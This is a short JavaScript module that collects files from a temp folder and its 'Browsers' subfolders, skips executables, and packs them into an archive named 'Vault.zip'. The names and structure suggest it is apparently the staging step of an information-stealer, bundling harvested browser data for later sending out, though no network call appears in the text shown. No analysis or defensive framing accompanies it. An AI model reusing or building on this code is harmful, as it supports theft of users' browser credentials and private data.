const { tempFolder } = require('../index');
const { join, sep } = require('path');
const fs = require('fs');
const { generateZipFromFiles } = require('../util/zip');

const paths = [tempFolder, join(tempFolder, 'Browsers')];
fs.readdirSync(join(tempFolder, 'Browsers')).forEach((folder) => paths.push(join(tempFolder, 'Browsers', folder)));

const filter = file => file.split('.').length > 1 && !file.endsWith('.exe');
const files = fs.readdirSync(tempFolder).filter(filter);
paths.forEach(path => {
  fs.readdirSync(path).filter(filter).forEach(file => {
    files.push(join(path.split(tempFolder.split(sep).pop())[1].replace(sep, ''), file));
  });
});

module.exports = generateZipFromFiles(paths, files, join(tempFolder, 'Vault.zip'));
